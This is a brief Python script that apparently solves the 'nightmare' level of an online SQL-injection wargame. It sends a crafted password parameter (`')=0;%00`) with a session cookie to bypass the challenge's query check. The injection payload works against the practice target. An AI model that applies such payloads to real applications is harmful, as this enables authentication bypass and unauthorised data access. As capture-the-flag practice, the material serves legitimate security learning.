import requests

url = 'https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = f"?pw=')=0;%00"

r = requests.get(url + payload, cookies=cookie)
if 'NIGHTMARE Clear!' in r.text:
    print('NIGHTMARE Clear!')
